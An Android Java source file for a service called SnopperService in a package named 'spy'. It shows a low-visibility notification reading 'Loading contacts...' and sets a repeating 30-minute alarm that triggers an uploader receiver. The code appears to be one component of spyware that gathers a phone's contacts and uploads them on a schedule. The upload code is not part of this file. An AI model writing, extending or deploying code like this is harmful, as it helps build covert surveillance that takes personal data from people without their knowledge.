package com.gameofcoding.spy.services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.receivers.UploaderAlarm;
import com.gameofcoding.spy.utils.XLog;

public class SnopperService extends Service {
    private static final String TAG = "SnopperService";
    private static final int SNOPPER_SERVICE_NOTIF_ID = 1;
    private Context mContext;
    private NotificationManager mNotificationManager;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "SnopperService has been started, preparing for loading data.");
	mContext = getApplicationContext();
	mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	// XXX: Only for debugging
	updateForegroundNotif("Loading contacts...");
	synchronized(this){try{wait(5000);}catch(Exception e) {throw new RuntimeException(e);}}
	updateForegroundNotif("Finishing");

	// Start alarm that repeats after 30 mins. for uploading changes
	AlarmManager alarmManager = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
	PendingIntent pendingIntent = PendingIntent
	    .getBroadcast(mContext, 0, new Intent(mContext, UploaderAlarm.class), 0);
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
				  1800_000, pendingIntent);

	// Stop service
	stopForeground(true);
	stopSelf();
        return START_STICKY;
    }


    @SuppressWarnings("deprecation")
    public void updateForegroundNotif(String contentText) {
	Notification.Builder notifBuilder = null;
	if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
	    // Register a notification channel for Oreo amd higher versions of android if we don't
	    // already have one
	    String channelID = getString(R.string.snopperservice_notif_channel_id);
	    notifBuilder = new Notification.Builder(mContext, channelID);
	    if (mNotificationManager.getNotificationChannel(channelID) == null) {
		String channelName = getString(R.string.snopperservice_notif_channel_name);
		String channelDescription = getString(R.string.snopperservice_notif_channel_desc);
		NotificationChannel channel =
		    new NotificationChannel(channelID, channelName,
					    NotificationManager.IMPORTANCE_MIN);
		channel.setDescription(channelDescription);
		mNotificationManager.createNotificationChannel(channel);
	    }
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	}

	// Start foreground notification
	notifBuilder.setSmallIcon(R.mipmap.ic_launcher)
	    .setContentTitle(getString(R.string.snopperservice_notif_content_title))
	    .setContentText(contentText);
	startForeground(SNOPPER_SERVICE_NOTIF_ID, notifBuilder.build());
    }
}
